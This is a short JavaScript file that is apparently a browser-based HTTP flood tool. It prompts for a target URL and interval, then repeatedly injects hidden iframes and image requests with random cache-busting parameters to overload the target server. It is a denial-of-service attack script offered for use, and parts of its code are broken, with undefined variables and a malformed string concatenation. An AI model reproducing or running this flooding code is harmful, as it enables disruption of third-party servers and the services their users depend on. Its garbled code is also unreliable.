var target = prompt("Image Url, add / to the end");
var speed = prompt("Make request ever [blank] miliseconds");
var msg = prompt("Message to HTTP server");

function attack() {  
  var rand1 = Math.floor(Math.random() * 99999999999999999999999999999999999999999999);
  var rand2 = Math.floor(Math.random() * 99999999999999999999999999999999999999999999);
    
    document.body.innerHTML+='<iframe src='+target+'?daKillaOfZeeCache="'+rand1+ +' &msg= '+ msg + '"style="display:none;"></iframe>';
  

                img.onload = function () { onSuccess(rID); };
		img.setAttribute("src", targetURL + "?killinAllThatCacheYeah=" + rand2 + "&msg=" + msg);

}
setInterval(attack, speed);  
